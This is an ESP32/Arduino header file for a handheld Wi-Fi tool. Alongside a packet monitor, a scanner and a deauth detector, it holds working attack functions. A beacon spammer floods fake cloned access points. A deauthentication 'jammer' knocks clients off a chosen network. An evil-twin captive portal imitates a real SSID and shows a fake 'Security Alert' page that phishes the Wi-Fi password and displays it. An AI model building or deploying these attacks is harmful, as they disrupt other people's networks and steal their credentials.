#ifndef TOOLS_H
#define TOOLS_H
#include "config.h"

static uint32_t pkts_counter = 0;
static bool deauth_detected_flag = false;
static String captured_pass = "";

// --- CALLBACKS ---
void sniffer_callback(void* buf, wifi_promiscuous_pkt_type_t type) { pkts_counter++; }
void deauth_sniffer_callback(void* buf, wifi_promiscuous_pkt_type_t type) {
  wifi_promiscuous_pkt_t* p = (wifi_promiscuous_pkt_t*)buf;
  if (p->payload[0] == 0xC0) deauth_detected_flag = true;
}

// 1. PACKET MONITOR
void runPacketMonitor() {
  gfx->fillScreen(M_BLACK);
  drawMatrixHeader("PACKET_MONITOR");
  int graph[240] = {0};
  WiFi.mode(WIFI_STA);
  esp_wifi_set_promiscuous(true);
  esp_wifi_set_promiscuous_rx_cb(&sniffer_callback);
  while(!feature_exit_requested) {
    for(int ch=1; ch<=13 && !feature_exit_requested; ch++) {
      esp_wifi_set_channel(ch, WIFI_SECOND_CHAN_NONE);
      pkts_counter = 0;
      delay(100);
      int h = pkts_counter * 3; if(h > 110) h = 110;
      memmove(graph, graph+1, 239 * sizeof(int)); graph[239] = h; 
      gfx->fillRect(0, 100, 240, 120, M_BLACK);
      for(int i=0; i<240; i++) if(graph[i] > 0) gfx->drawFastVLine(i, 210-graph[i], graph[i], M_GREEN);
      gfx->fillRect(0, 45, 240, 30, M_BLACK);
      gfx->setCursor(10, 55); gfx->setTextColor(M_GREEN); gfx->printf("CH: %02d | PKTS: %d", ch, pkts_counter);
      checkExit();
    }
  }
  esp_wifi_set_promiscuous(false);
}

// 2. BEACON SPAMMER (Fixed for Modern Phones & 9-bit Displays)
void runBeaconSpam() {
  gfx->fillScreen(M_BLACK);
  drawMatrixHeader("SCAN_FOR_SPAM");
  
  WiFi.mode(WIFI_AP_STA); // AP_STA মোড দিলে প্যাকেট ইনজেকশন ভালো কাজ করে
  int n = WiFi.scanNetworks();
  if (n <= 0) return;

  int sel = 0; bool picked = false; bool redraw = true;
  while (!picked && !feature_exit_requested) {
    if(redraw) {
      gfx->fillScreen(M_BLACK); 
      drawMatrixHeader("SELECT_TARGET");
      gfx->setTextSize(1);
      for (int i = 0; i < n && i < 8; i++) {
        int y = 65 + (i * 30);
        if (i == sel) { 
          gfx->fillRect(0, y-12, 240, 30, M_GREEN); 
          gfx->setTextColor(M_BLACK); 
        } else { 
          gfx->setTextColor(M_GREEN); 
        }
        gfx->setCursor(20, y); 
        gfx->printf("%d: %s", i+1, WiFi.SSID(i).substring(0,15).c_str());
      }
      redraw = false;
    }
    if (digitalRead(BTN_UP) == LOW) { sel = (sel <= 0) ? n-1 : sel-1; redraw = true; delay(200); }
    if (digitalRead(BTN_DOWN) == LOW) { sel = (sel >= n-1) ? 0 : sel+1; redraw = true; delay(200); }
    if (digitalRead(BTN_SELECT) == LOW) { delay(400); picked = true; }
    checkExit();
  }

  String baseSSID = WiFi.SSID(sel);
  int channel = WiFi.channel(sel);
  esp_wifi_set_promiscuous(true);
  esp_wifi_set_channel(channel, WIFI_SECOND_CHAN_NONE);

  gfx->fillScreen(M_BLACK); 
  drawMatrixHeader("SPAM_ACTIVE");
  gfx->setTextColor(M_GREEN);
  gfx->setCursor(10, 80); gfx->println("Target: " + baseSSID);
  gfx->setCursor(10, 100); gfx->println("Status: INJECTING...");

  while(!feature_exit_requested) {
    for(int i = 1; i <= 15; i++) {
      String fakeName = baseSSID + "_" + String(i);
      
      uint8_t packet[128]; 
      uint8_t fake_mac[6];
      for(int b=0; b<6; b++) fake_mac[b] = random(256);
      fake_mac[0] = 0x00; // Local Unicast MAC

      // 802.11 Beacon Frame Header (Standard 34 bytes)
      uint8_t header[] = { 
        0x80, 0x00, 0x00, 0x00, 
        0xff, 0xff, 0xff, 0xff, 0xff, 0xff, // Destination (Broadcast)
        fake_mac[0], fake_mac[1], fake_mac[2], fake_mac[3], fake_mac[4], fake_mac[5], // Source
        fake_mac[0], fake_mac[1], fake_mac[2], fake_mac[3], fake_mac[4], fake_mac[5], // BSSID
        0x00, 0x00, // Seq
        0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // Timestamp
        0x64, 0x00, 0x11, 0x04 
      };

      int pos = 0;
      memcpy(packet, header, sizeof(header));
      pos += sizeof(header);

      // --- SSID TAG (Tag 0) ---
      packet[pos++] = 0x00;
      packet[pos++] = fakeName.length();
      memcpy(&packet[pos], fakeName.c_str(), fakeName.length());
      pos += fakeName.length();

      // --- SUPPORTED RATES (Tag 1) - এটি খুব গুরুত্বপূর্ণ ---
      uint8_t rates[] = { 0x01, 0x08, 0x82, 0x84, 0x8b, 0x96, 0x24, 0x30, 0x48, 0x6c };
      memcpy(&packet[pos], rates, sizeof(rates));
      pos += sizeof(rates);

      // --- CHANNEL TAG (Tag 3) ---
      packet[pos++] = 0x03;
      packet[pos++] = 0x01;
      packet[pos++] = (uint8_t)channel;

      esp_wifi_80211_tx(WIFI_IF_STA, packet, pos, false);
      delay(2); // আপনার ৯-বিট ডিসপ্লের জন্য ছোট ডিলে প্রসেসরকে স্ট্যাবল রাখবে
    }
    
    if(checkExit()) break;
    yield(); 
  }
  esp_wifi_set_promiscuous(false);
}

// 3. DEAUTH DETECTOR
void runDeauthDetect() {
  gfx->fillScreen(M_BLACK);
  drawMatrixHeader("DEAUTH_DETECTOR");
  esp_wifi_set_promiscuous(true);
  esp_wifi_set_promiscuous_rx_cb(&deauth_sniffer_callback);
  while(!feature_exit_requested) {
    for(int ch=1; ch<=13 && !feature_exit_requested; ch++) {
      esp_wifi_set_channel(ch, WIFI_SECOND_CHAN_NONE);
      gfx->fillRect(0, 50, 240, 30, M_BLACK);
      gfx->setTextColor(M_GREEN); gfx->setCursor(10, 60); gfx->printf("SCANNING CH: %d", ch);
      unsigned long s = millis();
      while(millis() - s < 150) {
        if(deauth_detected_flag) {
          gfx->fillScreen(0xF800); delay(100); gfx->fillScreen(M_BLACK);
          drawMatrixHeader("ATTACK_DETECTED!");
          deauth_detected_flag = false;
        }
        if(checkExit()) break;
      }
    }
  }
  esp_wifi_set_promiscuous(false);
}

// 6. WiFi SCANNER (Cleaned for Matrix Style)
void runWifiScan() {
  gfx->fillScreen(M_BLACK); // Start with a clean black screen 
  drawMatrixHeader("SCAN_RESULTS");
  //drawScanlines(); // Visual matrix effect
  
  WiFi.mode(WIFI_STA); 
  WiFi.disconnect();
  int n = WiFi.scanNetworks();

  gfx->setTextSize(1);

  for (int i = 0; i < n && i < 12; i++) {
    int y = 45 + (i * 22);
    // Clear only this specific row before printing to prevent overlap
    gfx->fillRect(0, y, 240, 20, M_BLACK); 
    
    gfx->setCursor(10, y + 2);
    gfx->setTextColor(M_GREEN);
    // Format: "1: SSID_NAME [-RSSI]"
    gfx->printf("%d: %-12s [%d]", i + 1, WiFi.SSID(i).substring(0, 18).c_str(), WiFi.RSSI(i));
  }
  
  while(!feature_exit_requested) { 
    if(checkExit()) break; 
    delay(10); 
  }
}

// 5. DEAUTH ATTACK (JAMMER) - Matrix Terminal Edition
void runDeauthAttack() {
  gfx->fillScreen(M_BLACK);
  drawMatrixHeader("SCANNING...");
  WiFi.mode(WIFI_STA);
  int n = WiFi.scanNetworks();
  if (n <= 0) return;

  int sel = 0; 
  bool picked = false; 
  bool redraw = true;

  // --- TARGET SELECTION MENU ---
  while (!picked && !feature_exit_requested) {
    if(redraw) {
      gfx->fillScreen(M_BLACK);
      drawScanlines();
      drawMatrixHeader("JAM_TARGET_SEL");
      gfx->setTextSize(1);
      
      for (int i = 0; i < n && i < 8; i++) {
        int y = 70 + (i * 30);
        if (i == sel) { 
          gfx->fillRect(0, y-12, 240, 30, M_GREEN); 
          gfx->setTextColor(M_BLACK); 
        } else { 
          gfx->setTextColor(M_GREEN); 
        }
        gfx->setCursor(20, y); 
        gfx->printf("[%02d] %-15s", WiFi.channel(i), WiFi.SSID(i).substring(0,15).c_str());
      }
      redraw = false;
    }

    if (digitalRead(BTN_UP) == LOW) { sel = (sel <= 0) ? n-1 : sel-1; redraw = true; delay(200); }
    if (digitalRead(BTN_DOWN) == LOW) { sel = (sel >= n-1) ? 0 : sel+1; redraw = true; delay(200); }
    if (digitalRead(BTN_SELECT) == LOW) { delay(400); picked = true; }
    
    checkExit(); 
    delay(10);
  }

  // --- ATTACK INITIALIZATION ---
  uint8_t* bssid = WiFi.BSSID(sel);
  int targetCh = WiFi.channel(sel);
  String ssid = WiFi.SSID(sel);
  int sent = 0;

  esp_log_level_set("wifi", ESP_LOG_NONE);
  gfx->fillScreen(M_BLACK);
  drawScanlines();
  drawMatrixHeader("JAMMING_ACTIVE");

  gfx->setTextColor(M_GREEN);
  gfx->setCursor(10, 60); gfx->print("TARGET: "); gfx->println(ssid);
  gfx->setCursor(10, 85); gfx->print("BSSID : "); 
  gfx->printf("%02X:%02X:%02X:%02X:%02X:%02X", bssid[0], bssid[1], bssid[2], bssid[3], bssid[4], bssid[5]);

  // --- ATTACK LOOP ---
  while(!feature_exit_requested) {
    // Triple-Channel sweep for maximum disruption
    for(int chOffset = -1; chOffset <= 1; chOffset++) {
      int activeCh = targetCh + chOffset;
      if (activeCh < 1 || activeCh > 13) continue;
      
      esp_wifi_set_channel(activeCh, WIFI_SECOND_CHAN_NONE);

      // Packet Definitions
      uint8_t deauth_pkt[] = { 0xc0, 0x00, 0x3a, 0x01, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, bssid[0], bssid[1], bssid[2], bssid[3], bssid[4], bssid[5], bssid[0], bssid[1], bssid[2], bssid[3], bssid[4], bssid[5], 0x00, 0x00, 0x01, 0x00 };
      uint8_t null_pkt[] = { 0x48, 0x01, 0x3a, 0x01, bssid[0], bssid[1], bssid[2], bssid[3], bssid[4], bssid[5], 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, bssid[0], bssid[1], bssid[2], bssid[3], bssid[4], bssid[5], 0xc0, 0x6e };

      for(int i=0; i<30; i++) {
        esp_wifi_80211_tx(WIFI_IF_STA, deauth_pkt, sizeof(deauth_pkt), false);
        esp_wifi_80211_tx(WIFI_IF_STA, null_pkt, sizeof(null_pkt), false);
        sent += 2;
      }
      
      if (checkExit()) break;
    }

    // Anti-Flicker Status Update
    if(sent % 100 == 0) { 
        gfx->fillRect(0, 120, 240, 60, M_BLACK); // Clear only the data area
        gfx->setCursor(10, 135); gfx->setTextColor(M_GREEN);
        gfx->printf("INJECTED : %d", sent);
        gfx->setCursor(10, 160);
        gfx->printf("CURR_CH  : %d (+/-1)", targetCh);
    }
    delay(1);
  }
}

// 6. CAPTIVE PORTAL (Matrix Terminal Style - High Visibility)
void runPortal() {
  gfx->fillScreen(M_BLACK);
  drawMatrixHeader("SCAN_FOR_PORTAL");
  WiFi.mode(WIFI_STA);
  int n = WiFi.scanNetworks();
  if (n <= 0) return;

  int sel = 0; bool picked = false; bool redraw = true;
  while (!picked && !feature_exit_requested) {
    if(redraw) {
      gfx->fillScreen(M_BLACK); 
      drawScanlines(); // Visual consistency
      drawMatrixHeader("CLONE_SSID");
      gfx->setTextSize(1);
      for (int i = 0; i < n && i < 8; i++) {
        int y = 65 + (i * 30);
        if (i == sel) { 
          gfx->fillRect(0, y-12, 240, 30, M_GREEN); 
          gfx->setTextColor(M_BLACK); 
        } else { 
          gfx->setTextColor(M_GREEN); 
        }
        gfx->setCursor(20, y); 
        gfx->print(WiFi.SSID(i).substring(0,18).c_str());
      }
      redraw = false;
    }
    if (digitalRead(BTN_UP) == LOW) { sel = (sel <= 0) ? n-1 : sel-1; redraw = true; delay(200); }
    if (digitalRead(BTN_DOWN) == LOW) { sel = (sel >= n-1) ? 0 : sel+1; redraw = true; delay(200); }
    if (digitalRead(BTN_SELECT) == LOW) { delay(400); picked = true; }
    checkExit();
  }

  String fakeSSID = WiFi.SSID(sel) + " ";
  captured_pass = "";
  bool passDrawn = false; // Flag to stop blinking and constant redraws

  DNSServer dns; 
  WebServer server(80);
  WiFi.mode(WIFI_AP); 
  WiFi.softAP(fakeSSID.c_str(), "");
  dns.start(53, "*", WiFi.softAPIP());

  // Matrix styled HTML for the victim's phone
  String h = "<!DOCTYPE html><html><head><meta name='viewport' content='width=device-width,initial-scale=1'><style>body{font-family:monospace;background:#000;color:#0f0;text-align:center;padding:20px;}input{width:90%;padding:10px;margin:10px 0;background:#111;color:#0f0;border:1px solid #0f0;}button{padding:10px 20px;background:#0f0;border:none;color:#000;font-weight:bold;}</style></head><body><h2>Security Alert</h2><p>Connection lost. Re-authenticate to restore:</p><form action='/save' method='POST'><input type='password' name='p' required autofocus><br><button type='submit'>RECONNECT</button></form></body></html>";

  server.on("/", [&server, h]() { server.send(200, "text/html", h); });
  server.on("/save", HTTP_POST, [&server]() {
    captured_pass = server.arg("p");
    server.send(200, "text/html", "<h2>Authenticating...</h2><p>Please wait while the system reboots.</p>");
  });
  server.onNotFound([&server, h]() { server.send(200, "text/html", h); });
  server.begin();

  gfx->fillScreen(M_BLACK); 
  drawMatrixHeader("PORTAL_RUNNING");
  gfx->setCursor(10, 60); gfx->setTextColor(M_GREEN); gfx->setTextSize(1);
  gfx->println("SSID: " + fakeSSID);
  gfx->setCursor(10, 80); gfx->println("WAITING FOR PASSWORD...");

  while(!feature_exit_requested) {
    dns.processNextRequest(); 
    server.handleClient();

    if(captured_pass != "" && !passDrawn) {
      // Draw static success screen once to prevent blinking
      gfx->fillScreen(M_GREEN); 
      gfx->setTextColor(M_BLACK);
      
      gfx->setTextSize(2); // Increased size for visibility
      gfx->setCursor(10, 40); gfx->println("PASS CAPTURED:");
      
      gfx->setTextSize(3); // Large bold text for the password
      gfx->setCursor(10, 100); gfx->println(captured_pass);
      
      passDrawn = true; // Prevents the while loop from clearing/redrawing this screen
    }
    
    if(checkExit()) break;
    delay(1);
  }
}

#endif